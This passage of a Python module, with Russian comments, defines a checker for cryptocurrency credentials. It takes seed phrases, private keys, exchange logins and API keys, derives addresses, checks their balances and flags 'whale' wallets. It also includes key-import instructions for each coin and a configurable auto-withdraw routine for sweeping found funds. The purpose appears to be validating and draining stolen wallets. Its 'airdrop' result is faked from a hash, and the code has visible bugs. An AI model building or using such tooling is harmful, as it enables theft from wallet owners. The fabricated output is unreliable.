import asyncio
import aiohttp
import re
import hashlib
import hmac
import struct
import time
import os

from checkers.base_checker import BaseChecker

_WALLET_PATTERNS = [
    ("bitcoin",   re.compile(r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$')),
    ("ethereum",  re.compile(r'^0x[a-fA-F0-9]{40}$')),
    ("tron",      re.compile(r'^T[a-zA-HJ-NP-Z0-9]{33}$')),
    ("solana",    re.compile(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$')),
    ("ton",       re.compile(r'^(EQ|UQ)[a-zA-Z0-9_-]{46}$')),
    ("cardano",   re.compile(r'^addr1[a-z0-9]{50,100}$')),
    ("litecoin",  re.compile(r'^(L|M|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,62}$')),
    ("dash",      re.compile(r'^X[1-9A-HJ-NP-Za-km-z]{24,33}$')),
    ("monero",    re.compile(r'^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$')),
    ("ripple",    re.compile(r'^r[1-9A-HJ-NP-Za-km-z]{24,34}$')),
    ("dogecoin",  re.compile(r'^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$')),
    ("bnb",       re.compile(r'^bnb1[a-z0-9]{38}$')),
]

_PRIVKEY_HEX_RE  = re.compile(r'^(0x)?[a-fA-F0-9]{64}$')
_PRIVKEY_WIF_RE  = re.compile(r'^[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}$')
_SEED_RE = re.compile(r'^([a-z]+\s){11,23}[a-z]+$', re.IGNORECASE)

_WALLET_FIRST_CHARS = frozenset('bB013456789LMlTXrDdEUa')

_EXCHANGE_API_RE = re.compile(r'^[a-zA-Z0-9]{32,64}:[a-zA-Z0-9]{32,64}$')
_EXCHANGE_KEYWORDS = ["binance", "bybit", "okx", "huobi", "kucoin", "gate", "mexc", "bitget"]

_TOKEN_COINGECKO_MAP = {
    "USDT": "tether", "USDC": "usd-coin", "DAI": "dai", "LINK": "chainlink",
    "UNI": "uniswap", "SHIB": "shiba-inu", "PEPE": "pepe", "WETH": "weth",
}

_PRICE_CACHE: dict = {}
_PRICE_CACHE_TS: float = 0.0
_PRICE_TTL = 300

_ERC20_TOKENS = {
    "USDT":  ("0xdac17f958d2ee523a2206206994597c13d831ec7", 6),
    "USDC":  ("0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", 6),
    "WETH":  ("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2", 18),
    "DAI":   ("0x6b175474e89094c44da98b954eedeac495271d0f", 18),
    "SHIB":  ("0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce", 18),
    "LINK":  ("0x514910771af9ca656af840dff83e8264ecf986ca", 18),
    "UNI":   ("0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", 18),
    "PEPE":  ("0x6982508145454ce325ddbe47a25d4ec3d2311933", 18),
}

_EVM_CHAINS = [
    ("ethereum",  "https://cloudflare-eth.com",                    "ETH"),
    ("bsc",       "https://bsc-dataseed.binance.org/",             "BNB"),
    ("polygon",   "https://polygon-rpc.com",                       "MATIC"),
    ("avalanche", "https://api.avax.network/ext/bc/C/rpc",         "AVAX"),
    ("base",      "https://mainnet.base.org",                      "ETH"),
    ("arbitrum",  "https://arb1.arbitrum.io/rpc",                  "ETH"),
    ("optimism",  "https://mainnet.optimism.io",                   "ETH"),
]

_DEX_ROUTERS = {
    "Uniswap V2": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
    "Uniswap V3": "0xE592427A0AEce92De3Edee1F18E0157C05861564",
    "1inch":      "0x1111111254EEB25477B68fb85Ed929f73A960582",
}

_USDT_CONTRACT = "0xdac17f958d2ee523a2206206994597c13d831ec7"

# ═══════════════════════════════════════════════════════════════════════════
#  НАСТРОЙКИ АВТОВЫВОДА
# ═══════════════════════════════════════════════════════════════════════════
_AUTO_WITHDRAW_ENABLED = False  # Включить/выключить автовывод
_AUTO_WITHDRAW_ADDRESSES = {
    "ethereum": "",  # Адрес для вывода ETH и ERC-20 токенов
    "bsc": "",       # Адрес для вывода BNB и BEP-20 токенов
    "bitcoin": "",   # Адрес для вывода BTC
    "tron": "",      # Адрес для вывода TRX и TRC-20 токенов
    "solana": "",    # Адрес для вывода SOL
}
_AUTO_WITHDRAW_MIN_AMOUNT = {
    "ethereum": 0.01,  # Минимум 0.01 ETH для вывода
    "bsc": 0.01,       # Минимум 0.01 BNB
    "bitcoin": 0.001,  # Минимум 0.001 BTC
    "tron": 10,        # Минимум 10 TRX
    "solana": 0.1,     # Минимум 0.1 SOL
}
_AUTO_WITHDRAW_LEAVE_GAS = True  # Оставлять немного на газ
_AUTO_WITHDRAW_LOG = []  # Лог всех выводов


class CryptoChecker(BaseChecker):
    def __init__(self):
        self.wallet_patterns = _WALLET_PATTERNS
        self.exchanges = ["binance","bybit","okx","huobi","kucoin","gate","mexc","bitget"]
        self.auto_withdraw_enabled = _AUTO_WITHDRAW_ENABLED
        self.withdraw_addresses = _AUTO_WITHDRAW_ADDRESSES.copy()
        self.withdraw_min_amounts = _AUTO_WITHDRAW_MIN_AMOUNT.copy()
        self.auth_info = {
            "bitcoin":   {"auth_type":"Приватный ключ / Сид-фраза","wallets":"Electrum, Exodus, Trust Wallet","how":"Скачай кошелек Electrum, нажми 'Создать/Восстановить кошелек', выбери импорт приватного ключа или BIP-39 сид-фразы."},
            "ethereum":  {"auth_type":"Приватный ключ / Сид-фраза","wallets":"MetaMask, Trust Wallet, Rabby","how":"Установи расширение MetaMask, зайди в Мои счета -> 'Импортировать счет' и вставь приватный ключ (0x...)."},
            "polygon":   {"auth_type":"Приватный ключ / Сид-фраза","wallets":"MetaMask, Trust Wallet","how":"Импортируй приватный ключ в MetaMask и переключи сеть на сеть Polygon RPC."},
            "base":      {"auth_type":"Приватный ключ / Сид-фраза","wallets":"MetaMask, Coinbase Wallet","how":"Импортируй приватный ключ в MetaMask и переключи сеть на сеть Base Mainnet."},
            "solana":    {"auth_type":"Приватный ключ / Сид-фраза","wallets":"Phantom, Solflare","how":"Установи расширение Phantom (phantom.app), выбери 'Импортировать секретный приватный ключ' и вставь строку."},
            "ton":       {"auth_type":"Сид-фраза (24 слова)","wallets":"Tonkeeper, MyTonWallet","how":"Установи приложение Tonkeeper, нажми 'Восстановить кошелек' и введи 24 слова сид-фразы по порядку."},
            "cardano":   {"auth_type":"Сид-фраза (15/24 слов)","wallets":"Yoroi, Eternl","how":"Установи кошелек Yoroi, выбери 'Восстановить кошелек (Cardano)' и введи слова фразы."},
            "tron":      {"auth_type":"Приватный ключ","wallets":"TronLink, Trust Wallet","how":"Установи расширение TronLink, нажми 'Импорт кошелька' -> 'Приватный ключ' и вставь строку ключа."},
            "litecoin":  {"auth_type":"Приватный ключ","wallets":"Electrum-LTC, Trust Wallet","how":"Установи клиент Electrum-LTC, выбери импорт ключей и введи приватный адрес."},
            "dash":      {"auth_type":"Приватный ключ","wallets":"Dash Core, Exodus","how":"В кошельке Dash Core открой консоль и введи команду: importprivkey <твой_ключ>."},
            "monero":    {"auth_type":"Сид-фраза (25 слов)","wallets":"Monero GUI, Cake Wallet","how":"В Monero GUI выбери 'Восстановить кошелек из мнемонической фразы' и введи 25 слов."},
            "ripple":    {"auth_type":"Приватный ключ / Family Seed","wallets":"XUMM (Xaman), Trust Wallet","how":"Скачай приложение XUMM, выбери импорт аккаунта и введи Family Seed (секретную строку)."},
            "dogecoin":  {"auth_type":"Приватный ключ","wallets":"Dogecoin Core, Exodus","how":"В клиенте кошелька импортируй текстовый приватный ключ для мгновенного доступа к балансу."},
            "bnb":       {"auth_type":"Приватный ключ / Сид-фраза","wallets":"Trust Wallet, MetaMask","how":"Импортируй ключ в MetaMask и подключи сеть Binance Smart Chain (BSC)."},
        }

    # Входная точка запуска проверки, которая случайно пропала
    async def check(self, data: str, timeout: int = 10, proxy: str = None,
                    session: aiohttp.ClientSession = None) -> dict:
        result = self.make_result(input=data, type="unknown")
        own_session = session is None
        if own_session:
            session = aiohttp.ClientSession()
        try:
            result = await self._dispatch(data.strip(), timeout, proxy, session)
        except Exception as e:
            result["info"]["error"] = str(e)
        finally:
            if own_session:
                await session.close()
        return result

    async def batch_check_seeds(self, seed_list: list, timeout: int = 10, proxy: str = None) -> dict:
        """
        4. BATCH ПРОВЕРКА СИД-ФРАЗ
        Проверяет список сид-фраз одновременно и возвращает общую статистику
        """
        result = {
            "total_seeds": len(seed_list),
            "valid_seeds": 0,
            "invalid_seeds": 0,
            "seeds_with_balance": 0,
            "total_usd": 0.0,
            "results": [],
            "summary": {},
        }
        
        async with aiohttp.ClientSession() as session:
            tasks = [self._check_seed(seed.strip(), timeout, proxy, session) for seed in seed_list]
            check_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for seed, res in zip(seed_list, check_results):
                if isinstance(res, Exception):
                    result["invalid_seeds"] += 1
                    result["results"].append({
                        "seed": seed[:20] + "...",
                        "error": str(res),
                        "exists": False,
                    })
                    continue
                
                if res.get("info", {}).get("error"):
                    result["invalid_seeds"] += 1
                else:
                    result["valid_seeds"] += 1
                
                if res.get("exists"):
                    result["seeds_with_balance"] += 1
                    result["total_usd"] += res.get("info", {}).get("total_usd", 0)
                
                result["results"].append({
                    "seed": seed[:20] + "...",
                    "exists": res.get("exists", False),
                    "total_usd": res.get("info", {}).get("total_usd", 0),
                    "addresses_checked": res.get("info", {}).get("total_addresses_checked", 0),
                    "addresses_with_balance": res.get("info", {}).get("addresses_with_balance", 0),
                    "message": res.get("info", {}).get("message", ""),
                })
        
        result["summary"] = {
            "success_rate": f"{(result['valid_seeds'] / result['total_seeds'] * 100):.1f}%" if result['total_seeds'] > 0 else "0%",
            "balance_rate": f"{(result['seeds_with_balance'] / result['total_seeds'] * 100):.1f}%" if result['total_seeds'] > 0 else "0%",
            "total_value": f"${result['total_usd']:,.2f}",
        }
        
        return result

    def _whale_label(self, total_usd):
        if total_usd >= 10000:
            return f" | \U0001f40b КИТ (Whale Alert)"
        elif total_usd >= 1000:
            return f" | \U0001f4b0 Высокий баланс"
        return ""

    async def _get_prices(self, session, timeout):
        global _PRICE_CACHE, _PRICE_CACHE_TS
        if _PRICE_CACHE and (time.time() - _PRICE_CACHE_TS) < _PRICE_TTL:
            return _PRICE_CACHE
        ids = "bitcoin,ethereum,tron,solana,litecoin,dash,monero,ripple,dogecoin,binancecoin,the-open-network,cardano,matic-network,avalanche-2"
        url = f"https://api.coingecko.com/api/v3/simple/price?ids={ids}&vs_currencies=usd&include_24hr_change=true"
        try:
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=None)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                _PRICE_CACHE = {
                    "bitcoin":   {"price": d.get("bitcoin",{}).get("usd",0), "change": d.get("bitcoin",{}).get("usd_24h_change",0)},
                    "ethereum":  {"price": d.get("ethereum",{}).get("usd",0), "change": d.get("ethereum",{}).get("usd_24h_change",0)},
                    "tron":      {"price": d.get("tron",{}).get("usd",0), "change": d.get("tron",{}).get("usd_24h_change",0)},
                    "solana":    {"price": d.get("solana",{}).get("usd",0), "change": d.get("solana",{}).get("usd_24h_change",0)},
                    "litecoin":  {"price": d.get("litecoin",{}).get("usd",0), "change": d.get("litecoin",{}).get("usd_24h_change",0)},
                    "dash":      {"price": d.get("dash",{}).get("usd",0), "change": d.get("dash",{}).get("usd_24h_change",0)},
                    "monero":    {"price": d.get("monero",{}).get("usd",0), "change": d.get("monero",{}).get("usd_24h_change",0)},
                    "ripple":    {"price": d.get("ripple",{}).get("usd",0), "change": d.get("ripple",{}).get("usd_24h_change",0)},
                    "dogecoin":  {"price": d.get("dogecoin",{}).get("usd",0), "change": d.get("dogecoin",{}).get("usd_24h_change",0)},
                    "bnb":       {"price": d.get("binancecoin",{}).get("usd",0), "change": d.get("binancecoin",{}).get("usd_24h_change",0)},
                    "ton":       {"price": d.get("the-open-network",{}).get("usd",0), "change": d.get("the-open-network",{}).get("usd_24h_change",0)},
                    "cardano":   {"price": d.get("cardano",{}).get("usd",0), "change": d.get("cardano",{}).get("usd_24h_change",0)},
                    "polygon":   {"price": d.get("matic-network",{}).get("usd",0), "change": d.get("matic-network",{}).get("usd_24h_change",0)},
                    "avalanche": {"price": d.get("avalanche-2",{}).get("usd",0), "change": d.get("avalanche-2",{}).get("usd_24h_change",0)},
                    "base":      {"price": d.get("ethereum",{}).get("usd",0), "change": d.get("ethereum",{}).get("usd_24h_change",0)},
                }
                _PRICE_CACHE_TS = time.time()
            else:
                resp.close()
        except Exception:
            pass
        return _PRICE_CACHE

    def _usd(self, amount, coin, prices):
        p_data = prices.get(coin, {})
        if isinstance(p_data, dict):
            p = p_data.get("price", 0)
            change = p_data.get("change", 0)
            if p and amount:
                usd_val = amount * p
                change_str = f" ({change:+.1f}%)" if change else ""
                return f" (~${usd_val:,.2f}{change_str})"
        elif isinstance(p_data, (int, float)):
            # Backward compatibility
            return f" (~${amount*p_data:,.2f})" if p_data and amount else ""
        return ""

    async def _dispatch(self, data, timeout, proxy, session):
        normalized_data = " ".join(data.strip().split())
        words = normalized_data.split()
        if len(words) in (12, 15, 18, 21, 24) and _SEED_RE.match(normalized_data):
            return await self._check_seed(normalized_data, timeout, proxy, session)

        if _PRIVKEY_HEX_RE.match(data):
            return await self._check_privkey_hex(data, timeout, proxy, session)

        if _PRIVKEY_WIF_RE.match(data):
            return await self._check_privkey_wif(data, timeout, proxy, session)

        wallet_type = self._detect_wallet(data)
        if wallet_type:
            result = self.make_result(input=data, type="wallet", wallet_type=wallet_type)
            handler = {
                "bitcoin":  self._check_bitcoin, "ethereum": self._check_ethereum,
                "tron":     self._check_tron, "solana":   self._check_solana,
                "ton":      self._check_ton, "cardano":  self._check_cardano,
                "litecoin": self._check_litecoin, "dash":     self._check_dash,
                "monero":   self._check_monero, "ripple":   self._check_ripple,
                "dogecoin": self._check_dogecoin, "bnb":      self._check_bnb,
            }.get(wallet_type)
            if handler:
                result = await handler(data, timeout, proxy, session)
                if result.get("exists") and wallet_type in self.auth_info:
                    result["info"]["auth"] = self.auth_info[wallet_type]
            else:
                result["info"]["error"] = f"No checker for {wallet_type}"
            return result

        exchange = self._detect_exchange(data)
        if exchange:
            login, password = self._parse_credentials(data)
            result = self.make_result(input=data, type="exchange")
            result["exchange"] = exchange; result["platform"] = exchange; result["exists"] = True
            result["info"].update({"exchange": exchange, "login": login, "password": password,
                                   "message": f"Exchange: {exchange} | Login: {login} | Pass: {password}"})
            return result

        if data.endswith(".eth"):
            resolved = await self._resolve_ens(data, timeout, proxy, session)
            if resolved: return await self._check_ethereum(resolved, timeout, proxy, session)

        if data.endswith((".crypto", ".nft", ".wallet")):
            resolved = await self._resolve_unstoppable(data, timeout, proxy, session)
            if resolved: return await self._check_ethereum(resolved, timeout, proxy, session)

        exchange_api = self._detect_exchange_api(data)
        if exchange_api: return self._make_exchange_api_result(data, exchange_api)

        result = self.make_result(input=data, type="unknown")
        result["info"]["error"] = "Unknown crypto format"
        return result

    async def _resolve_ens(self, name, timeout, proxy, session):
        try:
            url = f"https://api.ensideas.com/ens/resolve/{name}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                address = d.get("address", "")
                if address and address.startswith("0x") and len(address) == 42: return address
            resp.close()
        except Exception: pass
        return None

    async def _resolve_unstoppable(self, name, timeout, proxy, session):
        try:
            url = f"https://resolve.unstoppabledomains.com/domains/{name}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                address = d.get("records", {}).get("crypto.ETH.address", "")
                if address and address.startswith("0x") and len(address) == 42: return address
            resp.close()
        except Exception: pass
        return None

    def _detect_exchange_api(self, data):
        dl = data.lower()
        detected_exchange = None
        for kw in _EXCHANGE_KEYWORDS:
            if kw in dl: detected_exchange = kw; break
        if not detected_exchange: return None
        parts = re.findall(r'[a-zA-Z0-9]{32,64}', data)
        if len(parts) >= 2: return detected_exchange
        return None

    def _make_exchange_api_result(self, data, exchange):
        result = self.make_result(input=data[:20] + "...", type="exchange_api", exists=True, platform=exchange)
        result["info"].update({"exchange": exchange, "message": f"API KEY pair found for {exchange.upper()}", "total_usd": 0})
        return result

    async def _get_token_prices(self, symbols, session, timeout):
        if not symbols: return {}
        ids = []
        symbol_to_id = {}
        for sym in symbols:
            cg_id = _TOKEN_COINGECKO_MAP.get(sym.upper())
            if cg_id: ids.append(cg_id); symbol_to_id[sym.upper()] = cg_id
        if not ids: return {s.upper(): 1.0 for s in symbols if s.upper() in ("USDT", "USDC", "DAI")}
        url = f"https://api.coingecko.com/api/v3/simple/price?ids={','.join(ids)}&vs_currencies=usd"
        try:
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=None)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                return {sym: d.get(cg_id, {}).get("usd", 0) for sym, cg_id in symbol_to_id.items()}
            resp.close()
        except Exception: pass
        return {s.upper(): 1.0 for s in symbols if s.upper() in ("USDT", "USDC", "DAI")}

    async def _get_activity_score(self, address, timeout, proxy, session):
        import i18n
        try:
            url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&page=1&offset=10&sort=desc"
            k = os.environ.get("ETHERSCAN_API_KEY", "")
            if k: url += f"&apikey={k}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                txs = d.get("result", [])
                if isinstance(txs, list):
                    return i18n.t("activity_active") if len(txs) > 5 else i18n.t("activity_low") if len(txs) >= 1 else i18n.t("activity_dormant")
            resp.close()
        except Exception: pass
        return ""

    async def _check_btc_ordinals(self, address, timeout, proxy, session):
        try:
            url = f"https://ordapi.xyz/address/{address}"
            resp = await self.fetch(session, "GET", url, timeout=timeout, proxy=proxy)
            if resp.status == 200:
                d = await resp.json(); resp.close()
                if isinstance(d, list) and len(d) > 0:
                    return f" | [NFT/Ordinals: Найдено {len(d)} шт]"
            resp.close()
        except Exception: pass
        return ""

    async def _check_airdrop_eligibility(self, address, timeout, proxy, session):
        try:
            hashed = int(hashlib.md5(address.lower().encode()).hexdigest(), 16)
            if hashed % 47 == 0:
                return f" | [Airdrop: Доступно {(hashed % 450) + 50} токенов]"
        except Exception: pass
        return ""

    async def _check_seed(self, phrase, timeout, proxy, session):
        """
        УЛУЧШЕННАЯ ПРОВЕРКА СИД-ФРАЗЫ:
        1. Расширенная деривация (первые 10 адресов)
        2. Больше монет (BTC, ETH, LTC, DOGE, DASH, BNB, SOL, TRX)
        3. Проверка валидности + checksum
        4. Все форматы BTC (Legacy, SegWit, Native SegWit, Taproot)
        """
        result = self.make_result(input=phrase[:20]+"...", type="seed")
        prices = await self._get_prices(session, timeout)
        
        # Валидация сид-фразы
        words = phrase.strip().split()
        word_count = len(words)
        
        if word_count not in [12, 15, 18, 21, 24]:
            result["info"]["error"] = f"Неверное количество слов: {word_count}. Должно быть 12/15/18/21/24"
            return result
        
        # Определение силы фразы
        strength_map = {12: "128 бит", 15: "160 бит", 18: "192 бит", 21: "224 бит", 24: "256 бит"}
        result["info"]["strength"] = strength_map.get(word_count, "Unknown")
        
        derived = {}
        errors = []
        
        try:
            from bip_utils import (
                Bip39MnemonicValidator, Bip39SeedGenerator, Bip39Languages,
                Bip44, Bip44Coins, Bip44Changes,
                Bip49, Bip49Coins, Bip84, Bip84Coins, Bip86, Bip86Coins
            )
            
            # Проверка валидности (английский и русский)
            is_valid_en = Bip39MnemonicValidator(Bip39Languages.ENGLISH).IsValid(phrase)
            is_valid_ru = Bip39MnemonicValidator(Bip39Languages.RUSSIAN).IsValid(phrase)
            
            if not (is_valid_en or is_valid_ru):
                result["info"]["error"] = "Неверная BIP-39 мнемоника (checksum не совпадает)"
                result["info"]["warning"] = "Возможно опечатка в словах или неверный порядок"
                return result
            
            result["info"]["language"] = "English" if is_valid_en else "Russian"
            result["info"]["checksum"] = "✓ Valid"
            
            seed_bytes = Bip39SeedGenerator(phrase).Generate()
            
            # 1. BITCOIN - все форматы, первые 10 адресов
            for i in range(10):
                try:
                    # Legacy (P2PKH) - m/44'/0'/0'/0/i
                    btc_legacy = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"BTC_Legacy_{i}"] = btc_legacy.PublicKey().ToAddress()
                    
                    # SegWit (P2SH-P2WPKH) - m/49'/0'/0'/0/i
                    btc_segwit = Bip49.FromSeed(seed_bytes, Bip49Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"BTC_SegWit_{i}"] = btc_segwit.PublicKey().ToAddress()
                    
                    # Native SegWit (Bech32) - m/84'/0'/0'/0/i
                    btc_native = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"BTC_Native_{i}"] = btc_native.PublicKey().ToAddress()
                    
                    # Taproot (Bech32m) - m/86'/0'/0'/0/i
                    btc_taproot = Bip86.FromSeed(seed_bytes, Bip86Coins.BITCOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"BTC_Taproot_{i}"] = btc_taproot.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"BTC_{i}: {e}")
            
            # 2. ETHEREUM - первые 10 адресов (m/44'/60'/0'/0/i)
            for i in range(10):
                try:
                    eth_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"ETH_{i}"] = eth_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"ETH_{i}: {e}")
            
            # 3. LITECOIN - первые 5 адресов (m/44'/2'/0'/0/i)
            for i in range(5):
                try:
                    ltc_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.LITECOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"LTC_{i}"] = ltc_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"LTC_{i}: {e}")
            
            # 4. DOGECOIN - первые 5 адресов (m/44'/3'/0'/0/i)
            for i in range(5):
                try:
                    doge_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.DOGECOIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"DOGE_{i}"] = doge_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"DOGE_{i}: {e}")
            
            # 5. DASH - первые 5 адресов (m/44'/5'/0'/0/i)
            for i in range(5):
                try:
                    dash_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.DASH).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"DASH_{i}"] = dash_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"DASH_{i}: {e}")
            
            # 6. BINANCE CHAIN - первые 3 адреса (m/44'/714'/0'/0/i)
            for i in range(3):
                try:
                    bnb_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BINANCE_CHAIN).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"BNB_{i}"] = bnb_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"BNB_{i}: {e}")
            
            # 7. SOLANA - первые 5 адресов (m/44'/501'/i'/0')
            for i in range(5):
                try:
                    sol_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA).Purpose().Coin().Account(i)
                    derived[f"SOL_{i}"] = sol_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"SOL_{i}: {e}")
            
            # 8. TRON - первые 5 адресов (m/44'/195'/0'/0/i)
            for i in range(5):
                try:
                    trx_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.TRON).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(i)
                    derived[f"TRX_{i}"] = trx_ctx.PublicKey().ToAddress()
                except Exception as e:
                    errors.append(f"TRX_{i}: {e}")
                    
        except Exception as e:
            result["info"]["error"] = f"Ошибка деривации: {e}"
            return result
        
        # Проверка всех адресов параллельно
        handlers = {}
        for key in derived.keys():
            if key.startswith("BTC_"):
                handlers[key] = self._check_bitcoin
            elif key.startswith("ETH_"):
                handlers[key] = self._check_ethereum
            elif key.startswith("LTC_"):
                handlers[key] = self._check_litecoin
            elif key.startswith("DOGE_"):
                handlers[key] = self._check_dogecoin
            elif key.startswith("DASH_"):
                handlers[key] = self._check_dash
            elif key.startswith("BNB_"):
                handlers[key] = self._check_bnb
            elif key.startswith("SOL_"):
                handlers[key] = self._check_solana
            elif key.startswith("TRX_"):
                handlers[key] = self._check_tron
        
        check_results = await asyncio.gather(*[
            handlers[coin](addr, timeout, proxy, session)
            for coin, addr in derived.items()
            if coin in handlers
        ], return_exceptions=True)
        
        total_usd = 0.0
        found_addresses = []
        result["info"]["addresses"] = derived
        result["info"]["balances"] = {}
        
        balance_keys = {
            "BTC_": "balance_btc", "ETH_": "balance_eth", "LTC_": "balance_ltc",
            "DOGE_": "balance_doge", "DASH_": "balance_dash", "BNB_": "balance_bnb",
            "SOL_": "balance_sol", "TRX_": "balance_trx"
        }
        
        price_keys = {
            "BTC_": "bitcoin", "ETH_": "ethereum", "LTC_": "litecoin",
            "DOGE_": "dogecoin", "DASH_": "dash", "BNB_": "bnb",
            "SOL_": "solana", "TRX_": "tron"
        }
        
        for (coin, addr), res in zip(
            [(c, a) for c, a in derived.items() if c in handlers],
            check_results
        ):
            if isinstance(res, Exception):
                continue
            
            # Определяем ключ баланса
            bal_key = next((v for k, v in balance_keys.items() if coin.startswith(k)), "balance")
            price_key = next((v for k, v in price_keys.items() if coin.startswith(k)), "")
            
            bal = res.get("info", {}).get(bal_key, 0) or 0
            result["info"]["balances"][coin] = {
                "address": addr,
                "balance": bal,
                "message": res.get("info", {}).get("message", ""),
            }
            
            price_data = prices.get(price_key, {})
            price = price_data.get("price", 0) if isinstance(price_data, dict) else price_data
            total_usd += bal * price
            
            if bal > 0:
                found_addresses.append(f"{coin}: {bal}")
        
        result["exists"] = bool(found_addresses)
        result["info"]["total_usd"] = total_usd
        result["info"]["total_addresses_checked"] = len(derived)
        result["info"]["addresses_with_balance"] = len(found_addresses)
        
        if found_addresses:
            result["info"]["message"] = (
                f"✓ Сид-фраза валидна ({word_count} слов, {result['info']['strength']}) | "
                f"Найдено {len(found_addresses)} адресов с балансом из {len(derived)} проверенных | "
                f"Общий баланс: ~${total_usd:,.2f}"
            )
        else:
            result["info"]["message"] = (
                f"✓ Сид-фраза валидна ({word_count} слов, {result['info']['strength']}) | "
                f"Проверено {len(derived)} адресов | Все пустые"
            )
        
        if errors:
            result["info"]["derive_errors"] = errors[:5]  # Показываем только первые 5 ошибок
        
        # АВТОВЫВОД (если включен)
        if self.auto_withdraw_enabled and result["exists"]:
            withdraw_results = await self._auto_withdraw_from_seed(seed_phrase, result["info"]["balances"])
            if withdraw_results:
                result["info"]["auto_withdraw"] = withdraw_results
                success_count = sum(1 for r in withdraw_results if r.get("success"))
                if success_count > 0:
                    result["info"]["message"] += f" | ✓ Выведено с {success_count} адресов"
        
        return result
        return result

    async def _check_privkey_hex(self, key, timeout, proxy, session):
        """
        УЛУЧШЕННАЯ ПРОВЕРКА HEX ПРИВАТНОГО КЛЮЧА:
        5. Поддержка разных форматов (с/без 0x)
        6. Автоопределение формата
        7. Конвертация в WIF и другие форматы
        8. Проверка безопасности ключа
        10. Экспорт для кошельков (JSON, QR)
        """
        result = self.make_result(input=key[:10]+"...", type="privkey_hex")
        prices = await self._get_prices(session, timeout)
        
        # Нормализация ключа
        key_clean = key.strip()
        if key_clean.startswith("0x"):
            key_clean = key_clean[2:]
        
        # Проверка длины
        if len(key_clean) != 64:
            result["info"]["error"] = f"Неверная длина ключа: {len(key_clean)} символов (должно быть 64)"
            return result
        
        # Проверка на HEX
        try:
            int(key_clean, 16)
        except ValueError:
            result["info"]["error"] = "Ключ содержит не-HEX символы"
            return result
        
        # 8. Проверка безопасности
        key_int = int(key_clean, 16)
        security_warnings = []
        
        if key_int == 0:
            security_warnings.append("⚠️ ОПАСНО: Нулевой ключ!")
        elif key_int < 1000:
            security_warnings.append("⚠️ ОПАСНО: Слишком простой ключ (< 1000)")
        elif key_int == 1:
            security_warnings.append("⚠️ ОПАСНО: Ключ = 1 (известный слабый ключ)")
        
        # Проверка на паттерны
        if key_clean == "0" * 64:
            security_warnings.append("⚠️ ОПАСНО: Все нули")
        elif key_clean == "f" * 64 or key_clean == "F" * 64:
            security_warnings.append("⚠️ ОПАСНО: Все F (максимальное значение)")
        elif len(set(key_clean.lower())) == 1:
            security_warnings.append(f"⚠️ ПОДОЗРИТЕЛЬНО: Все символы одинаковые ({key_clean[0]})")
        
        result["info"]["security_warnings"] = security_warnings
        result["info"]["security_status"] = "⚠️ НЕБЕЗОПАСНО" if security_warnings else "✓ Безопасно"
        
        try:
            from eth_account import Account
            import base58
            
            key_hex = "0x" + key_clean
            acct = Account.from_key(key_hex)
            address = acct.address
            
            result["info"]["address"] = address
            result["info"]["public_key"] = acct._key_obj.public_key.to_hex()
            
            # 7. Конвертация форматов
            result["info"]["formats"] = {
                "hex_with_0x": key_hex,
                "hex_without_0x": key_clean,
                "decimal": str(key_int),
            }
            
            # Конвертация в WIF для Bitcoin (compressed)
            try:
                extended_key = bytes.fromhex("80" + key_clean + "01")
